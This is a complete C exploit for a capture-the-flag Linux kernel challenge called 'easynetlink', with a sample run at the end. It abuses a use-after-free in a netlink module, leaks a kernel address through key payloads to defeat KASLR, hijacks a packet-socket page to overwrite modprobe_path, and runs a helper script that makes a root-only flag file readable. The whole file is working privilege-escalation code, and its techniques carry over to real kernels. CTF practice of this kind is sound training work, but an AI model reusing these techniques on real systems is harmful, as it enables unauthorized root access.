// gcc -o fs/exploit exploit.c -lmnl
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <asm/ldt.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>

#include <linux/genetlink.h>
#include <libmnl/libmnl.h>
#define PWN_NAME "easynetlink"
#define CMD_ADD 2
#define ADD_NOUSE 1

#define CMD_DELE 1
#define DELE_NOUSE 1
#define DELE_CHECK 2

#define CMD_EDIT 4
#define EDIT_LEN 1
#define EDIT_IDX 2
#define EDIT_PTR 3

#define REDS "\033[31m\033[1m"
#define REDE "\033[0m"
#define fail_exit(msg) { printf(REDS"[Error %s, %d line, %s]: %s\n"REDE, \
                __FUNCTION__, __LINE__, __FILE__, msg);\
                exit(-1); }


void err_exit(char *msg)
{
	puts(msg);
	sleep(2);
	exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

int key_alloc(char *description, char *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, char *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, char *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    if(unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))
        err_exit("FAILED to create a new namespace");

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) puts("setsockopt(PACKET_VERSION)"), exit(-1);
   
    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) puts("setsockopt(PACKET_RX_RING)"), exit(-1);
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) puts("socket(AF_PACKET)"), exit(-1);
    
    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) puts("bind(AF_PACKET)"), exit(-1);
    
    return s;
}
// count 为 pg_vec 数组的大小, 即 pg_vec 的大小为 count*8
// size/4096 为要分配的 order
int pagealloc_pad(int count, int size) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}

uint32_t PWN_ID;
static int data_attr_cb(const struct nlattr *attr, void *data) {
        const struct nlattr **tb = data;
        int type = mnl_attr_get_type(attr);
        if (mnl_attr_type_valid(attr, CTRL_ATTR_MAX) < 0)
                return MNL_CB_OK;
        switch (type) {
                case CTRL_ATTR_FAMILY_NAME:
                        if (mnl_attr_validate(attr, MNL_TYPE_STRING) < 0) {
                                perror("mnl_attr_validate");
                                return MNL_CB_ERROR;
                        }
                        break;
                case CTRL_ATTR_FAMILY_ID:
                        if (mnl_attr_validate(attr, MNL_TYPE_U16) < 0) {
                                perror("mnl_attr_validate");
                                return MNL_CB_ERROR;
                        }
                        break;
                case CTRL_ATTR_VERSION:
                case CTRL_ATTR_HDRSIZE:
                case CTRL_ATTR_MAXATTR:
                        if (mnl_attr_validate(attr, MNL_TYPE_U32) < 0) {
                                perror("mnl_attr_validate");
                                return MNL_CB_ERROR;
                        }
                        break;
                case CTRL_ATTR_OPS:
                case CTRL_ATTR_MCAST_GROUPS:
                        if (mnl_attr_validate(attr, MNL_TYPE_NESTED) < 0) {
                                perror("mnl_attr_validate");
                                return MNL_CB_ERROR;
                        }
                        break;
        }
        tb[type] = attr;
        return MNL_CB_OK;
}

static int data_cb(const struct nlmsghdr *nlh, void *data) {
        struct nlattr *tb[CTRL_ATTR_MAX + 1] = {};
        struct genlmsghdr *genl = mnl_nlmsg_get_payload(nlh);
        mnl_attr_parse(nlh, sizeof(*genl), data_attr_cb, tb);
        if (tb[CTRL_ATTR_FAMILY_NAME]) {
                printf("name=%s\t", mnl_attr_get_str(tb[CTRL_ATTR_FAMILY_NAME]));
        }
        if (tb[CTRL_ATTR_FAMILY_ID]) {
                PWN_ID = mnl_attr_get_u16(tb[CTRL_ATTR_FAMILY_ID]);
                printf("id=%u\t", PWN_ID);
        }
        if (tb[CTRL_ATTR_VERSION]) {
                printf("version=%u\t", mnl_attr_get_u32(tb[CTRL_ATTR_VERSION]));
        }
        if (tb[CTRL_ATTR_HDRSIZE]) {
                printf("hdrsize=%u\t", mnl_attr_get_u32(tb[CTRL_ATTR_HDRSIZE]));
        }
        if (tb[CTRL_ATTR_MAXATTR]) {
                printf("maxattr=%u\t", mnl_attr_get_u32(tb[CTRL_ATTR_MAXATTR]));
        }
        printf("\n");
        return MNL_CB_OK;
}

void get_family_id() {
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        struct genlmsghdr *genl;
        int ret;
        unsigned int seq, portid;
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = GENL_ID_CTRL;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = seq = time(NULL);
        genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
        genl->cmd = CTRL_CMD_GETFAMILY;
        genl->version = 1;
        mnl_attr_put_u32(nlh, CTRL_ATTR_FAMILY_ID, GENL_ID_CTRL);
        mnl_attr_put_strz(nlh, CTRL_ATTR_FAMILY_NAME, PWN_NAME);
        nl = mnl_socket_open(NETLINK_GENERIC);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }
        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);
        if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
                perror("mnl_socket_sendto");
                exit(EXIT_FAILURE);
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, seq, portid, data_cb, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1) {
                perror("error");
                exit(EXIT_FAILURE);
        }
        mnl_socket_close(nl);
}

void add() {
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        struct genlmsghdr *genl;
        int ret;
        unsigned int seq, portid;
        nl = mnl_socket_open(NETLINK_GENERIC);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }
        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = PWN_ID;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = seq = time(NULL);
        genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
        genl->cmd = CMD_ADD;
        genl->version = 1;
        mnl_attr_put_u64(nlh, ADD_NOUSE, (uint64_t)2);
        if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
                perror("mnl_socket_sendto");
                exit(EXIT_FAILURE);
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1){
                fail_exit("error");
        }
        mnl_socket_close(nl);
}

void dele() {
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        struct genlmsghdr *genl;
        int ret;
        unsigned int seq, portid;
        nl = mnl_socket_open(NETLINK_GENERIC);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }
        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = PWN_ID;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = seq = time(NULL);
        genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
        genl->cmd = CMD_DELE;
        genl->version = 1;
     	mnl_attr_put_u64(nlh, DELE_CHECK, 0);
        if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
                perror("mnl_socket_sendto");
                exit(EXIT_FAILURE);
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
             ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1){
                perror("error");
                exit(EXIT_FAILURE);
        }
        mnl_socket_close(nl);
}

void edit(int len, char* ptr) {
	struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        struct genlmsghdr *genl;
        int ret;
        unsigned int seq, portid;
        nl = mnl_socket_open(NETLINK_GENERIC);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }
        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = PWN_ID;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = seq = time(NULL);
        genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
        genl->cmd = CMD_EDIT;
        genl->version = 1;
        mnl_attr_put_u64(nlh, EDIT_IDX, 0);
        mnl_attr_put_u64(nlh, EDIT_LEN, len);
//        mnl_attr_put_strz(nlh, EDIT_PTR, ptr);
  	mnl_attr_put(nlh, EDIT_PTR, 9, ptr);
  	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
                perror("mnl_socket_sendto");
                exit(EXIT_FAILURE);
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
             ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1){
                perror("error");
                exit(EXIT_FAILURE);
	}       
        mnl_socket_close(nl);
}

void get_flag(){
        system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x"); // modeprobe_path 修改为了 /tmp/x
        system("chmod +x /tmp/x");
        system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy"); // 非法格式的二进制文件
        system("chmod +x /tmp/dummy");
        system("/tmp/dummy"); // 执行非法格式的二进制文件 ==> 执行 modeprobe_path 指向的文件 /tmp/x
        sleep(0.3);
        system("cat /flag");
}

int main(int argc, char** argv, char** envp)
{
	int pipe_fd[2];
	pipe(pipe_fd);
	pid_t pid = fork();
	if (!pid) {
		bind_core(0);
		#define KEY_NUMS (8+2)
		int keys[KEY_NUMS];
		int ooo_idx = 0;
		int ooo[0x200];
		char desc[0x10] = { 0 };
		char buf[0x20000] = { 0 };
		int res = 0;
		int packet_fd = 0;
		uint64_t kbase = 0xffffffff81000000;
		uint64_t koffset = -1;
		uint64_t user_free_payload_rcu = 0xffffffff81608850;
		uint64_t modprobe_path = 0xffffffff831d8ce0;
		unshare_setup();
		get_family_id();
		
		memset(buf, '\xff', sizeof(buf));
		for (int i = 0; i < KEY_NUMS; i++) {
			sprintf(desc, "%s%d", "XiaozaYa", i);
			keys[i] = key_alloc(desc, buf, 240);
			if (keys[i] < 0) fail_exit("key_alloc");
		}

		sprintf(desc, "%s", "Pwner");
		add();
		dele();
		int key = key_alloc(desc, buf, 240);
		if (key < 0) fail_exit("key_alloc");

		dele();
		setxattr("./", "Pwner", buf, 300, 0);
		memset(buf, 0, sizeof(buf));
		res = key_read(key, buf, 0xffff);
		if (res < 0) fail_exit("key_read");
		if (res < 250) fail_exit("Not Hit");

		for (int i = 0; i < KEY_NUMS; i++) key_revoke(keys[i]);
		res = key_read(key, buf, 0xffff);
		uint64_t *ptr = (uint64_t*)buf;
		for (int i = 0; i < res / 8; i++) {
			if (ptr[i]>0xffffffff81000000 && (ptr[i]&0xffffffff00000000) == 0xffffffff00000000) {
				if ((ptr[i]&0xfff) == 0x850) {
					koffset = ptr[i] - user_free_payload_rcu;
					kbase += koffset;
					break;
				}
			}
		}
		if (koffset == -1) fail_exit("FAILED to bypass kaslr");
		modprobe_path += koffset;
		hexx("koffset", koffset);
		hexx("kbase", kbase);
		hexx("modprobe_path", modprobe_path);

		add();
		dele();
		packet_fd = pagealloc_pad(33, 4096);
		if (packet_fd < 0) fail_exit("pagealloc_pad");
		uint64_t addr[2] = { modprobe_path & (~0xfff) };
		edit(8, addr);
		char *page = mmap(NULL, 0x1000*33, PROT_READ|PROT_WRITE, MAP_SHARED, packet_fd, 0);
		if (page == MAP_FAILED) fail_exit("mmap");
	
		char *modptr = page+(modprobe_path&0xfff);
		puts(modptr);
		strcpy(modptr, "/tmp/x");
		get_flag();

		while(1) {}
		exit(0);
	} else if (pid < 0) {
		fail_exit("fork");
	} else {
		wait(NULL);
		puts("EXP NERVER END!");
	}
	return 0;
}


/*
/ $ cat flag
cat: can't open 'flag': Permission denied
/ $ ls -alh flag
-rw-------    1 root     root          16 May 18 13:23 flag
/ $ /exploit
[*] Process binded to core 0
name=easynetlink        id=36   version=1       hdrsize=0       maxattr=4
[+] koffset: 0x32200000
[+] kbase: 0xffffffffb3200000
[+] modprobe_path: 0xffffffffb53d8ce0
/sbin/modprobe
/tmp/dummy: line 1: ����: not found
flag{test_flag}
*/
